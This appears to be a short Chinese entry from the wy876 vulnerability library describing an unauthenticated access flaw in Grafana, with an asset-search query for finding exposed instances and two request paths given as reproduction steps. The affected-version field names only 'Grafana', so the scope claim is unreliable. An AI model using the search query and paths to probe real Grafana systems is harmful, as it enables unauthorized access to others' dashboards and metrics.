---
source: "wy876 漏洞文库"
---

# Grafana存在未授权访问漏洞

# 一、漏洞描述
Grafana是一个开源的可视化和分析平台，一个通用的可视化工具。‘通用’意味着Grafana不仅仅适用于展示Prometheus下的监控数据，也同样适用于一些其他的数据可视化需求。Grafana存在未授权访问漏洞，未经身份验证的用户可以绕过前端安全认证，未授权访问通过登录页面访问系统仪表板区域。

# 二、影响版本
Grafana

# 三、资产测绘
```plain
app="Grafana"
```


# 三、漏洞复现
```plain
/?orgId=1
```


```plain
/metrics
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/iwh76cslo7q2l2wy>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
